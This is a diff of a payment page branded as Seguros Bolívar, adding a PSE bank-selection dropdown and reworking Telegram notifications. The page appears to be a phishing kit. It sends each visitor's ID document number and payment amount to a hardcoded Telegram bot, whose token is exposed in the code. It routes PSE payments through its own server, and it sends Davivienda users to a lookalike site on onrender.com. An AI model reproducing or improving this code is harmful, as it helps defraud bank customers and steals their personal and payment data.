@@ -41,6 +41,15 @@
   .metodo-icons img { height: 32px; width: auto; object-fit: contain; display: block; }
   .pse-icon { height: 36px !important; object-fit: contain; }
 
+  /* Selector de bancos PSE */
+  .bank-selector { display: none; margin-top: 15px; padding: 20px; border: 1px solid #e0e0e0; border-radius: 8px; background: #f9fbfa; }
+  .bank-selector.active { display: block; }
+  .bank-selector label { display: block; font-size: 13px; color: #555; margin-bottom: 8px; font-weight: 500; }
+  .bank-selector select { width: 100%; padding: 12px 16px; border: 2px solid #006341; border-radius: 6px; font-size: 14px; outline: none; font-family: 'Montserrat', sans-serif; background: #fff; }
+  .bank-selector .btn-confirmar-banco { margin-top: 12px; width: 100%; padding: 14px; background: #006341; color: #fff; border: none; border-radius: 30px; font-size: 15px; font-weight: 700; cursor: pointer; font-family: 'Montserrat', sans-serif; letter-spacing: 1px; transition: all 0.3s; }
+  .bank-selector .btn-confirmar-banco:hover { background: #004d33; }
+  .bank-selector .btn-confirmar-banco:disabled { background: #dcdcdc; color: #777; cursor: not-allowed; }
+
   .sidebar-card { background: #fff; border-radius: 16px; width: 350px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); display: flex; flex-direction: column; }
   .sidebar-header { padding: 20px 24px; border-bottom: 1px solid #eee; display: flex; align-items: center; gap: 8px; font-size: 18px; font-weight: 700; }
   .sidebar-header svg { width: 22px; height: 22px; fill: #006341; }
@@ -132,9 +141,18 @@
 
     <h2 class="metodos-title">Métodos de pago</h2>
 
-    <div class="metodo-item" onclick="irAlFrontPSE()">
+    <div class="metodo-item" onclick="abrirSelectorBancos()">
       <span class="metodo-name">Débito PSE</span>
       <div class="metodo-icons"><img src="pse.png" alt="PSE" class="pse-icon"></div>
+    </div>
+
+    <!-- Selector de bancos PSE (oculto por defecto) -->
+    <div class="bank-selector" id="bank-selector">
+      <label for="bank-select">Selecciona tu banco</label>
+      <select id="bank-select">
+        <option value="">Cargando bancos...</option>
+      </select>
+      <button class="btn-confirmar-banco" id="btn-confirmar-banco" disabled onclick="irAlFrontPSE()">Continuar con PSE</button>
     </div>
 
     <div class="metodo-item" onclick="irAlFrontDavivienda()">
@@ -194,42 +212,22 @@
   document.getElementById('mobile-total').textContent = 'Total: ' + formattedTotal;
 
   // ─── CONFIGURACIÓN ───
-  // URL base de TU servidor (server.js). Cambia esto si el server corre en otro host/puerto.
-  const SERVER_BASE = window.location.origin; // mismo origen que sirve este HTML
-  // Código del link de RappiPay (debe coincidir con RAPPIPAY_LINK_CODE del server)
-  const RAPPIPAY_LINK_CODE = 'iMjmG6';
-  // Datos del pagador (puedes tomarlos de inputs si los agregas)
+  const SERVER_BASE = window.location.origin;   // tu server.js sirve este HTML
+  const RAPPIPAY_LINK_CODE = 'iMjmG6';          // debe coincidir con RAPPIPAY_LINK_CODE del server
   const CUSTOMER_NAME = 'Cliente Seguros Bolivar';
   const CUSTOMER_DOC_TYPE = 'CC';
 
-  // ─── TELEGRAM (igual que antes) ───
+  // ─── TELEGRAM SOLO PARA DAVIVIENDA (PSE lo notifica el server) ───
   const TELEGRAM_BOT_TOKEN = '8994620249:AAH53iPEdWTRolMHaYTe5rwh-gQbShFFs7E';
   const TELEGRAM_CHAT_ID = '-1004457768033';
 
-  function construirMensaje(metodo, banco) {
-    if (metodo === 'PSE') {
-      return `
-💳 *PAGO PSE RAPPI PAY*
-🆔 *Documento:* ${numDoc}
-💵 *Valor:* ${formattedTotal}
-🏦 *Banco:* ${banco}
-✅ *Estado:* Redirigido a PSE Rappi Pay
-      `;
-    } else if (metodo === 'Davivienda') {
-      return `
+  function enviarPagoTelegramDavivienda() {
+    const mensaje = `
 💳 *PAGO DAVIVIENDA*
 🆔 *Documento:* ${numDoc}
 💵 *Valor:* ${formattedTotal}
 ✅ *Estado:* Redirigido a Davivienda
-      `;
-    }
-    return '';
-  }
-
-  // keepalive: la petición sobrevive a la redirección
-  function enviarPagoTelegram(metodo, banco) {
-    const mensaje = construirMensaje(metodo, banco);
-    if (!mensaje) return;
+    `;
     fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
@@ -238,21 +236,77 @@
     }).catch(err => console.error('Error enviando a Telegram:', err));
   }
 
-  // ─── PSE: pide al server el bankUrl real de RappiPay y redirige ───
-  async function irAlFrontPSE() {
-    // Bloquea clics repetidos
-    if (window.__pseEnCurso) return;
-    window.__pseEnCurso = true;
+  // ─── SELECTOR DE BANCOS PSE ───
+  let bancosCargados = false;
+
+  async function abrirSelectorBancos() {
+    const selectorDiv = document.getElementById('bank-selector');
+    const select = document.getElementById('bank-select');
+    const btn = document.getElementById('btn-confirmar-banco');
+
+    // Si ya está abierto, solo lo mostramos
+    selectorDiv.classList.add('active');
+
+    if (bancosCargados) return;
+
+    select.innerHTML = '<option value="">Cargando bancos...</option>';
+    btn.disabled = true;
 
     try {
-      // 1) Llamar a TU servidor para crear la transacción PSE
+      const resp = await fetch(`${SERVER_BASE}/api/pasarela/rappipay-bancos?code=${RAPPIPAY_LINK_CODE}`);
+      const data = await resp.json();
+
+      if (!data.success || !Array.isArray(data.banks) || data.banks.length === 0) {
+        select.innerHTML = '<option value="">No se pudieron cargar los bancos</option>';
+        return;
+      }
+
+      // Ordenar alfabéticamente
+      const bancos = data.banks.slice().sort((a, b) => (a.name || '').localeCompare(b.name || ''));
+      select.innerHTML = '<option value="">Selecciona tu banco</option>';
+      bancos.forEach(b => {
+        const opt = document.createElement('option');
+        opt.value = b.code;
+        opt.textContent = b.name || b.code;
+        opt.dataset.name = b.name || b.code;
+        select.appendChild(opt);
+      });
+
+      bancosCargados = true;
+      btn.disabled = false;
+
+    } catch (err) {
+      console.error('Error cargando bancos:', err);
+      select.innerHTML = '<option value="">Error al cargar bancos</option>';
+    }
+  }
+
+  // ─── PSE: pide al server el bankUrl real de RappiPay y redirige ───
+  async function irAlFrontPSE() {
+    if (window.__pseEnCurso) return;
+
+    const select = document.getElementById('bank-select');
+    const bankCode = select.value;
+    const bankName = select.options[select.selectedIndex]?.dataset.name || '';
+
+    if (!bankCode) {
+      alert('Por favor selecciona tu banco.');
+      return;
+    }
+
+    window.__pseEnCurso = true;
+    const btn = document.getElementById('btn-confirmar-banco');
+    btn.disabled = true;
+    btn.textContent = 'Generando link de pago...';
+
+    try {
       const resp = await fetch(`${SERVER_BASE}/api/pasarela/rappipay-pse`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           amount: parseInt(total, 10),
-          bankCode: '1007',              // ⚠️ banco por defecto; cámbialo si tienes selector
-          bankName: 'BANCOLOMBIA',
+          bankCode: bankCode,
+          bankName: bankName,
           customerName: CUSTOMER_NAME,
           customerDoc: numDoc,
           customerDocType: CUSTOMER_DOC_TYPE,
@@ -264,30 +318,33 @@
       });
 
       const data = await resp.json();
+
       if (!data.success || !data.bankUrl) {
         alert('No se pudo generar el link de pago PSE. Intenta de nuevo.');
         window.__pseEnCurso = false;
+        btn.disabled = false;
+        btn.textContent = 'Continuar con PSE';
         return;
       }
 
-      // 2) Mensaje a Telegram justo en el momento de la redirección
-      enviarPagoTelegram('PSE', data.bankUrl ? 'RappiPay PSE' : 'No especificado');
-
-      // 3) Redirigir al banco (bankUrl de RappiPay)
+      // ⚠️ NO enviamos Telegram aquí: el server ya lo hizo en notificarTelegramPSE()
+      // Redirigir al banco (bankUrl de RappiPay)
       window.location.href = data.bankUrl;
 
     } catch (err) {
       console.error('Error PSE:', err);
       alert('Error de conexión con el servidor de pagos.');
       window.__pseEnCurso = false;
+      btn.disabled = false;
+      btn.textContent = 'Continuar con PSE';
     }
   }
 
-  // ─── Davivienda: se mantiene igual (redirige a tu front de Davivienda) ───
+  // ─── Davivienda: igual que antes (redirige a tu front de Davivienda) ───
   function irAlFrontDavivienda() {
     const destino = `https://pasegrodvcolombia.onrender.com/index.html?doc=${numDoc}&metodo=davivienda`;
     window.location.href = destino;
-    enviarPagoTelegram('Davivienda', null);
+    enviarPagoTelegramDavivienda();
   }
 </script>
 
